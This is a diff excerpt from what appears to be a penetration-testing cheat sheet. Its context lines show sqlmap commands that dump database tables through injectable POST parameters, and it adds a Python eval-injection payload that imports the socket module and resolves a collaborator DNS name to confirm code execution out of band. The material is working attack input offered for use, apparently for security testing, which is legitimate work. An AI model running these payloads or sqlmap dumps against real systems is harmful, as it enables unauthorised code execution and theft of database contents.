@@ -1902,6 +1902,11 @@ sqlmap -u https://<fqdn>/page.php --dbms=mysql --data "parameter1=knownval&param
 sqlmap -u https://<fqdn>/page.php --dbms=mysql --data "parameter1=knownval&paramter2=knownval2" -D <db_name> -T <table_name> --dump
 
 ##############################
+#### Python Eval Injection ###
+##############################
+__import__("socket").gethostbyname("<collaborator_dns_name>")
+
+##############################
 #### JS / XSS Payloads #######
 ##############################
 
